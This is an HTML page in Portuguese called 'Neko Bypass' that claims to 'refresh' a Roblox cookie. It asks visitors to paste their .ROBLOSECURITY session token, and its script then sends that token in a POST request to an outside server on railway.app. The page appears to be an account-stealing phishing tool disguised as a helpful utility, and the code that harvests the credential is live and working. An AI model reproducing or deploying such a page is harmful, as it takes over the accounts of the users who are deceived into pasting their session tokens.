<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="index, follow">
  <meta http-equiv="X-UA-Compatible" content="chrome=1" />
  <title>Neko Bypass</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous" />
  <style>
    body {
      background-color: #000;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 30px;
    }

    .main-title {
      font-size: 32px;
      margin-bottom: 20px;
    }

    input[type="text"] {
      width: 60%;
      padding: 10px;
      border-radius: 5px;
      border: 1px solid #444;
      background-color: #1e1e1e;
      color: white;
      margin-bottom: 20px;
    }

    button {
      padding: 10px 20px;
      background-color: #1e1e1e;
      color: white;
      border: none;
      border-radius: 5px;
      transition: 0.3s;
    }

    button:hover {
      background-color: #333;
    }

    #resposta {
      margin-top: 20px;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>

  <h1 class="main-title">Refresh seu Cookie</h1>
  <input type="text" id="cookie" placeholder="Cole seu .ROBLOSECURITY aqui" />
  <br>
  <button onclick="enviarCookie()">Refresh</button>
  <p id="resposta"></p>

  <script>
    async function enviarCookie() {
      const cookie = document.getElementById("cookie").value;
      const respostaElement = document.getElementById("resposta");

      try {
        const resposta = await fetch("https://robloxbp-production.up.railway.app/refresh", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ cookie })
        });

        const dados = await resposta.json();
        respostaElement.innerText = JSON.stringify(dados, null, 2);
      } catch (erro) {
        respostaElement.innerText = "Erro ao processar resposta: " + erro.message;
      }
    }
  </script>

</body>
</html>
